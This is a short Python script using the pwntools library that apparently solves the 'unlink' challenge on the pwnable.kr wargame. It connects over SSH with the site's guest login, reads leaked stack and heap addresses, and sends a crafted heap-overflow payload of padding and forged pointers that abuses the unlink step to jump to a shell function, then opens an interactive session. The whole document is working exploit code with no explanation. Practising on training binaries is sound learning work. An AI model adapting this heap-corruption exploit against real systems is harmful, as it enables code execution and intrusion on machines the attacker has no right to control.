from pwn import *


pwn_ssh = ssh(host='pwnable.kr',user='unlink',password='guest',port=2222)
p = pwn_ssh.process(executable="./unlink")
line1=p.readline().strip()
line2=p.readline().strip()
stack_addr = int(line1.split(': 0x')[1], 16)
heap_addr = int(line2.split(': 0x')[1], 16)
shell_addr = 0x080484eb

p.sendline('A'*16 + p32(heap_addr+0x24) + p32(stack_addr+0x10) + p32(shell_addr))
p.interactive()
